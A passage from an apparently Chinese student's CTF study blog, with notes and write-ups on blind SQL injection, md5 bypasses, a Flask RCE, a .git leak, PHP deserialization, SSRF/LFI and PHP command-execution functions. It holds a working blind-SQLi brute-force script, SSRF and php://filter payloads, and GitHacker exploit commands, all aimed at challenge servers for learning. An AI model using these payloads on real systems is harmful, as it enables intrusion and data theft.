<span class="keyword">if</span> tip==<span class="number">1</span>:</span><br><span class="line">                temp_d+=<span class="string">&quot;)&quot;</span></span><br><span class="line">            temp+=temp_d</span><br><span class="line">        temp+=<span class="string">&quot;,&quot;</span></span><br><span class="line">    temp=temp[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(formatString(&quot;0x63746673686f777b&quot;))</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;https://b036c57f-7f3a-4e41-b156-331186bc453b.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"><span class="comment">#dic的顺序可以改一下！我是懒得改了！改顺序可以提高效率！！！</span></span><br><span class="line">dic=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> dic:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(formatString(flag+x))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[**] &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#print(&quot;[--] &#123;&#125; is wrong&quot;.format(x))</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[flag]:&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/top10/SQL/" data-id="cm1zvswq0000hrkasee8ncd0i" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-top10/md5绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/top10/md5%E7%BB%95%E8%BF%87/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T02:40:41.321Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><h3 id="fastcoll"><a href="#fastcoll" class="headerlink" title="fastcoll"></a>fastcoll</h3><h2 id="等号"><a href="#等号" class="headerlink" title="等号"></a>等号</h2><p>三个等号是强等于，两个等号是若等于</p>
<h4 id="弱等于"><a href="#弱等于" class="headerlink" title="弱等于"></a>弱等于</h4><ul>
<li>字符串，比如前面都是数字，可能会解析成md5一样</li>
<li>0e开头是若等于</li>
<li>数组绕过，null,md5只能编码数字，数组是错误</li>
<li>string（）强制转化</li>
</ul>
<p>![屏幕截图 2024-09-21 015002](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-09-21 015002.png)</p>
<p>弱绕过可以0e开头那个</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/top10/md5%E7%BB%95%E8%BF%87/" data-id="cm1zvswq1000lrkas5g6l7adz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-top10/shctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/top10/shctf/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T02:40:41.321Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="1zflask"><a href="#1zflask" class="headerlink" title="1zflask"></a>1zflask</h3><h6 id="进入是404"><a href="#进入是404" class="headerlink" title="进入是404"></a>进入是404</h6><p>![屏幕截图 2024-10-05 153231](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 153231.png) </p>
<h5 id="提示是robots，那就去访问robots-txt"><a href="#提示是robots，那就去访问robots-txt" class="headerlink" title="提示是robots，那就去访问robots.txt"></a>提示是robots，那就去访问robots.txt</h5><p>![屏幕截图 2024-10-05 150747](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 150747.png)<img src="https://example.com/image.jpg" style="float: left; margin-right: 10px;"></p>
<h5 id="访问-s3recttt-下载app-py"><a href="#访问-s3recttt-下载app-py" class="headerlink" title="访问&#x2F;s3recttt,下载app.py"></a>访问&#x2F;s3recttt,下载app.py</h5><p>![屏幕截图 2024-10-05 150954](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 150954.png)<img src="https://example.com/image.jpg" style="float: left; margin-right: 10px;"></p>
<h5 id="解读一下"><a href="#解读一下" class="headerlink" title="解读一下"></a>解读一下</h5><ul>
<li><p>引用模块，flask是web的模块</p>
</li>
<li><p>app变量名，创建一个flask实例，name表示当前模块名，让flask正确找到</p>
</li>
<li><p>flask里面的路由，访问api的时候执行函数</p>
<ul>
<li>request类里面的args（类似字典的类）属性，args里面的get方法，给出sshctf键值，否则默认ls</li>
<li>os.popen（要执行的命令）获取命令执行完成的内容，.read()读取付给变量</li>
</ul>
</li>
<li><p>路由robots，send_from_derectory表示从静态文件夹中发送robots，app.static_folder是路径（是默认静态文件的路径）</p>
</li>
<li><p>路由s3recttt,send_file发送文件，file_path文件路径,as__attachment&#x3D;true以附件形式，浏览器中就是直接下载了</p>
</li>
<li><p>行代码检查当前脚本是否作为主程序运行。如果是，它将启动 Flask 应用，并开启调试模式。在调试模式下，Flask 会提供一个交互式的调试器和自动重载功能。</p>
</li>
</ul>
<h5 id="访问-api，执行ls"><a href="#访问-api，执行ls" class="headerlink" title="访问&#x2F;api，执行ls &#x2F;"></a>访问&#x2F;api，执行ls &#x2F;</h5><p>![屏幕截图 2024-10-05 152824](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 152824.png)<img src="https://example.com/image.jpg" style="float: left; margin-right: 10px;"></p>
<h5 id="得到"><a href="#得到" class="headerlink" title="得到"></a>得到</h5><p>![屏幕截图 2024-10-05 152929](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 152929.png)<img src="https://example.com/image.jpg" style="float: left; margin-right: 10px;"></p>
<h2 id="ez-gittt"><a href="#ez-gittt" class="headerlink" title="ez_gittt"></a>ez_gittt</h2><h5 id="进入是"><a href="#进入是" class="headerlink" title="进入是"></a>进入是</h5><p>![屏幕截图 2024-10-05 153329](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 153329.png)<img src="https://example.com/image.jpg" style="float: left; margin-right: 10px;"></p>
<h5 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h5><p>得到提示：<!--你说这个Rxuxin会不会喜欢把自己的秘密写到git之类什么的--> </p>
<h5 id="访问-git"><a href="#访问-git" class="headerlink" title="访问&#x2F;.git"></a>访问&#x2F;.git</h5><p>![屏幕截图 2024-10-05 153652](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 153652.png)<img src="https://example.com/image.jpg" style="float: left; margin-right: 10px;"></p>
<h5 id="进入logs"><a href="#进入logs" class="headerlink" title="进入logs"></a>进入logs</h5><p>![屏幕截图 2024-10-05 153805](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 153805.png)<img src="https://example.com/image.jpg" style="float: left; margin-right: 10px;"></p>
<h5 id="需要克隆下来"><a href="#需要克隆下来" class="headerlink" title="需要克隆下来"></a>需要克隆下来</h5><p>不支持git clone，用git hacker，<a target="_blank" rel="noopener" href="https://github.com/WangYihang/GitHacker">WangYihang&#x2F;GitHacker: 🕷️ A <code>.git</code> folder exploiting tool that is able to restore the entire Git repository, including stash, common branches and common tags. (github.com)</a></p>
<p>用法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># install</span><br><span class="line">python3 -m pip install -i https://pypi.org/simple/ GitHacker</span><br><span class="line"># print help info</span><br><span class="line">githacker --help</span><br><span class="line"># quick start</span><br><span class="line">githacker --url http://127.0.0.1/.git/ --output-folder result</span><br><span class="line"># brute for the name of branchs / tags</span><br><span class="line">githacker --brute --url http://127.0.0.1/.git/ --output-folder result</span><br><span class="line"># exploit multiple websites, one site per line</span><br><span class="line">githacker --brute --url-file websites.txt --output-folder result</span><br></pre></td></tr></table></figure>

<h5 id="看日志，找文件"><a href="#看日志，找文件" class="headerlink" title="看日志，找文件"></a>看日志，找文件</h5><p>![屏幕截图 2024-10-05 164111](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 164111.png)</p>
<p>!(..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 164138.png)</p>
<p>![屏幕截图 2024-10-05 164138](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 164138.png)</p>
<h2 id="poppopop"><a href="#poppopop" class="headerlink" title="poppopop"></a>poppopop</h2><h5 id="题目是"><a href="#题目是" class="headerlink" title="题目是"></a>题目是</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SH</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$Web</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$SHCTF</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;p)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$n</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        SH::<span class="variable">$Web</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        SH::<span class="variable">$SHCTF</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;o-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;其实。。。。,&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHCTF</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (SH::<span class="variable">$Web</span>) &#123;</span><br><span class="line"></span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;isyou)(<span class="variable language_">$this</span>-&gt;flag);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;小丑竟是我自己呜呜呜~&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;小丑别看了!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;小丑离我远点！！！&quot;</span>;</span><br><span class="line">&#125; 小丑离我远点！！</span><br></pre></td></tr></table></figure>

<ul>
<li>__destruct()销毁实例调用，没用就是销毁，就是入口</li>
</ul>
<p>![屏幕截图 2024-10-05 172119](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 172119.png) {: .left}{: .left}</p>
<h2 id="单身十八年的手速"><a href="#单身十八年的手速" class="headerlink" title="单身十八年的手速"></a>单身十八年的手速</h2><p>![屏幕截图 2024-10-05 173332](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 173332.png)</p>
<ul>
<li>一直点，点到520，有弹窗，base64</li>
<li>goole，f12</li>
</ul>
<h2 id="蛐蛐-蛐蛐"><a href="#蛐蛐-蛐蛐" class="headerlink" title="蛐蛐?蛐蛐!"></a>蛐蛐?蛐蛐!</h2><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>![屏幕截图 2024-10-05 180156](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 180156.png)1</p>
<h5 id="查看源代码-1"><a href="#查看源代码-1" class="headerlink" title="查看源代码"></a>查看源代码</h5> <!--听说，k1留了fault不想让你看到的源码在source.txt中-->

<p>![屏幕截图 2024-10-05 180207](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 180207.png)1</p>
<ul>
<li>数字的弱比较，就会把后边的a省略掉</li>
<li>eval就相当于一个shell界面了，用 分号分割就好了</li>
</ul>
<p>![屏幕截图 2024-10-05 182017](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-10-05 182017.png)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/top10/shctf/" data-id="cm1zvswq1000mrkas7gqggx6p" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-top10/http请求头" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/top10/http%E8%AF%B7%E6%B1%82%E5%A4%B4/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T02:40:41.320Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="http请求头"><a href="#http请求头" class="headerlink" title="http请求头"></a>http请求头</h1><h3 id="content-type"><a href="#content-type" class="headerlink" title="content-type"></a>content-type</h3><p>定义数据的类型，告诉浏览器收到的数据该怎么解析</p>
<ul>
<li><p>text&#x2F;html html文档</p>
</li>
<li><p>text&#x2F;plain 纯文本格式</p>
</li>
<li><p>application&#x2F;json json格式的数据，在现代web服务中用于&#x3D;&#x3D;前后端数据传输&#x3D;&#x3D;非常普遍</p>
</li>
<li><p>application&#x2F;xml xml格式的数据</p>
</li>
<li><p>image&#x2F;jpeg imag&#x2F;png image&#x2F;gif 图像格式</p>
</li>
<li><p>application&#x2F;x-www-form-type 传递表单数据<br>这种格式下，表单数据被编码成键值对</p>
</li>
</ul>
<h1 id="post"><a href="#post" class="headerlink" title="post"></a>post</h1><p>post的请求内容和请求头之间空一行，请求内容后边不要空行</p>
<h1 id="http请求头-1"><a href="#http请求头-1" class="headerlink" title="http请求头"></a>http请求头</h1><p>![屏幕截图 2024-09-20 200938](..&#x2F;c盘移过来的&#x2F;图片&#x2F;Screenshots&#x2F;屏幕截图 2024-09-20 200938.png)</p>
<p>你的ip，x-forward-for：&#x3D;&#x3D;空格&#x3D;&#x3D;，再加值</p>
<p>%的url编译是%25</p>
<p>重定向</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/top10/http%E8%AF%B7%E6%B1%82%E5%A4%B4/" data-id="cm1zvswq0000krkas8o1t4ist" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-top10/basectf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/top10/basectf/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T02:40:41.318Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="aura的礼物"><a href="#aura的礼物" class="headerlink" title="aura的礼物"></a>aura的礼物</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Aura 酱，欢迎回家~</span></span><br><span class="line"><span class="comment">// 这里有一份礼物，请你签收一下哟~</span></span><br><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)<span class="comment">//pen=data://text/plain,Aura</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span></span><br><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)<span class="comment">//ssrf是很松的，url格式为scheme://user:password@address:port/path?query#fragment//schem是协议，很松data，filter啥的都是协议#后边不会传给后端，只给前端，密码可以留空白，challenge=http://jasmineaura.github.io</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);<span class="comment">//获取链接里面的内容，url真正的链接在艾特后边，challenge=http://jasmineaura.github.io@127.0.0.1这个页面的链接，只要有这句话就行，因为是等于false</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span></span><br><span class="line"><span class="variable">$gift</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;gift&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$gift</span>);<span class="comment">//include会解析php，所以用php://filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p>127.0.0.1是这个电脑的所有文件？，file_get_contents读取谁呢</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/top10/basectf/" data-id="cm1zvswq0000irkasgfuldxit" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-top10/8rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/top10/8rce/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T02:40:41.317Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h1><p>remote code execution远程代码执行<br>在服务器上执行代码</p>
<h1 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h1><h3 id="命令-注入commmand-injection"><a href="#命令-注入commmand-injection" class="headerlink" title="&#x3D;&#x3D;命令&#x3D;&#x3D;注入commmand injection"></a>&#x3D;&#x3D;命令&#x3D;&#x3D;注入commmand injection</h3><ul>
<li><h4 id="系统命令-执行函数"><a href="#系统命令-执行函数" class="headerlink" title="&#x3D;&#x3D;系统命令&#x3D;&#x3D;执行函数"></a>&#x3D;&#x3D;系统命令&#x3D;&#x3D;执行函数</h4></li>
<li><p>system()<br>passthru()<br>exec()<br>shell_exec()<br>popen()<br>proc_open()<br>pcntl_exec()</p>
</li>
<li><p>system（‘ls’）执行系统命令，有&#x3D;&#x3D;回显&#x3D;&#x3D;，输出&#x3D;&#x3D;最后一行&#x3D;&#x3D;ls后的结果是直接输出，&#x3D;&#x3D;返回值是状态码&#x3D;&#x3D;，如果将返回值赋给一个变量，echo之后是状态码</p>
</li>
<li><p>passthru（）回显，全部输出给浏览器，<del>通常用于输出二进制数据命令，如音频视频流</del></p>
<p><code>passthru(&#39;echo exec(&#39;ls&#39;)&#39;)</code> 不会执行 <code>ls</code> 命令。这里的 <code>exec</code> 函数被包含在单引号中，所以它被视为普通字符串的一部分，而不是一个函数调用。细品，虽然是括号一点一点来</p>
</li>
<li><p>exec（）返回值，返回最后一行，exec（‘ls-a’,$a）&#x2F;exec($a,$b)</p>
<p>exec(木马)，在蚁剑或者cmd&#x3D;system（‘ls’）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 初始化一个数组来存储输出</span><br><span class="line">$数组变量= array();</span><br><span class="line"></span><br><span class="line">// 执行命令并捕获输出</span><br><span class="line">exec(&#x27;ls -l&#x27;, $数组, $returnVar);</span><br><span class="line"></span><br><span class="line">// 检查命令是否成功执行</span><br><span class="line">if ($returnVar == 0) &#123;</span><br><span class="line">    // 命令成功执行，输出结果</span><br><span class="line">    echo &quot;命令执行成功，输出如下：&quot; . PHP_EOL;//换行符，防止不兼容</span><br><span class="line">    foreach ($数组名 as $line) &#123;//foreach是遍历数组</span><br><span class="line">        echo $line . PHP_EOL;//这是想输出all，只输出最后一行的话直接输出就行</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // 命令执行失败，处理错误</span><br><span class="line">    echo &quot;命令执行失败，返回状态码：&quot; . $returnVar;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


</li>
<li><p>shell_exec(‘ls-la’)（这个是PHP的函数）&#x3D;&#x3D;返回值&#x3D;&#x3D;，&#x3D;&#x3D;返回值是字符串&#x3D;&#x3D;，回想一下，返回值不输出，要手动echo，</p>
</li>
<li><p>popen（）执行一个命令，然后返回指针，可以用标准的文件函数（如 <code>fgets()</code> 和 <code>fwrite()</code>）来读取或发送数据。&#x3D;&#x3D;（细品，返回值要赋给一个变量，这个变量就是这个返回值了，指针也好，布尔也好）&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 执行 &#x27;ls&#x27; 命令并获取文件指针</span><br><span class="line">$handle = popen(&#x27;ls&#x27;, &#x27;r&#x27;);</span><br><span class="line">//popen() 以只读模式打开 ls 命令的输出</span><br><span class="line">// 读取输出</span><br><span class="line">while (!feof($handle)) &#123;//fefo（指针），指针在文件末尾就会返回true</span><br><span class="line">    echo fgets($handle) . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 关闭文件指针</span><br><span class="line">pclose($handle);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="代码-注入code-injection"><a href="#代码-注入code-injection" class="headerlink" title="&#x3D;&#x3D;代码&#x3D;&#x3D;注入code injection"></a>&#x3D;&#x3D;代码&#x3D;&#x3D;注入code injection</h3><ul>
<li><p>eval</p>
</li>
<li><p>assert</p>
</li>
<li><p>creat_function</p>
</li>
<li><p>call_user_func</p>
</li>
<li><p>preg_replace</p>
</li>
<li><p>array_map</p>
</li>
<li><p>array_filter</p>
</li>
<li><p>echo的双引号</p>
</li>
<li></li>
<li><p>eval（‘echo $a；’）（注&#x3D;&#x3D;意里面有分号）&#x3D;&#x3D;（这是个PHP函数）括号里执行的是&#x3D;&#x3D;PHP命令&#x3D;&#x3D;,一句话木马啥的都行</p>
</li>
